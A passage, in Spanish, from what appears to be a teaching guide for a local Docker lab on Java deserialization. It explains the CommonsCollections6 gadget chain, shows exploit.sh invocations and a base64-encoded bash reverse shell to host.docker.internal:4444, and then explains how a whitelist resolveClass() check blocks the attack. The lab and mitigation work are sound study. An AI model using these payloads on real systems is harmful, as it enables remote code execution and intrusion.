pipelines de transformación (funcionalidad legítima, nada "malicioso"
en su diseño), pero eso significa que cualquiera que pueda construir
un objeto `LazyMap`+`ChainedTransformer` desde cero puede encadenar
**cualquier llamada reflexiva a cualquier método público**, incluido
`Runtime.exec()`. El bug no está en una línea de código rota, está en
que la deserialización nativa de Java reconstruye grafos de objetos
completos — incluidos sus efectos colaterales (`hashCode()`,
`equals()`, `readObject()` de cada clase) — sin que el programa que
deserializa tenga ninguna oportunidad de decir "esto no lo esperaba".

### 8.5 Reproducir el exploit sabiendo todo esto (sin fuzzing)

Con el conocimiento de arriba, generar y mandar el payload directo —
mismo resultado que `exploit.sh`, pero justificado por análisis de
código en vez de prueba y error:

```bash
docker-compose run --rm exploit http://target-app:8080 "id" /cart/restore
```

o, para mostrar la reverse shell (sección 7) sabiendo de antemano que
`bash` está disponible en el container (`target-app/Dockerfile` usa
`eclipse-temurin:8-jre`, base Ubuntu con `bash`, verificado en sesión:
`docker exec target-app sh -c "which bash"`):

```bash
RSHELL='bash -i >& /dev/tcp/host.docker.internal/4444 0>&1'
B64=$(printf '%s' "$RSHELL" | base64 -w0)
docker run --rm --network lab-deserializacion_lab-net --entrypoint ./exploit.sh \
  lab-deserializacion-exploit http://target-app:8080 \
  "/bin/bash -c {echo,${B64}}|{base64,-d}|bash" /cart/restore
```

### 8.6 Por qué la mitigación lo frena (comparar código, no solo ejecutar)

`WhitelistObjectInputStream.java:45-52`:

```java
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    String name = desc.getName();
    if (!ALLOWED_CLASSES.contains(name)) {
        throw new InvalidClassException(name, "Clase no permitida por whitelist de deserializacion");
    }
    return super.resolveClass(desc);
}
```

`resolveClass()` corre **para cada clase** que el stream necesita
resolver, **antes** de instanciarla — es decir, antes del paso 1 de la
sección 8.4. `HashMap`/`TiedMapEntry`/`LazyMap`/`ChainedTransformer`/
`InvokerTransformer` no están en `ALLOWED_CLASSES`
(`WhitelistObjectInputStream.java:32-39`, que solo lista `Cart`,
`CartItem`, `ArrayList`, `String`) → la excepción se lanza en la
**primera** clase ajena al whitelist, antes de que `LazyMap.get()`
exista siquiera como objeto, mucho antes de llegar a
`InvokerTransformer.transform()`. Por eso no importa cuál de los 5
gadgets de CC3.1 se use — todos dependen de clases que no son `Cart`/
`CartItem`, todos quedan afuera por el mismo mecanismo.

### 8.7 Guión resumido (bullets para la exposición)

1. "El sink está en `CartController.java:97` — un `readObject()` sin
   ningún filtro."
2. "La librería es `commons-collections:3.1`, vulnerable por
   `CVE-2015-7501`."
3. "El JDK es 8u512, parchado desde 8u71 — eso descarta
   `CommonsCollections1` de entrada, sin necesidad de probarlo."
4. "El gadget que sí funciona, `CommonsCollections6`, abusa de
   `LazyMap` + `InvokerTransformer` — reflexión encadenada que termina
   en `Runtime.exec()`, todo dentro de clases de la librería, nada del
   código de la app."
5. "La mitigación real intercepta esto en `resolveClass()` — rechaza
   la clase antes de que exista como objeto, ver
   `WhitelistObjectInputStream.java:48`."

## Apagar todo

```bash
docker-compose down
docker rm -f target-app              # si se levanto con `docker run` directo (seccion 6.4)
docker rm -f revshell-listener        # si se uso la variante A de la seccion 7
```
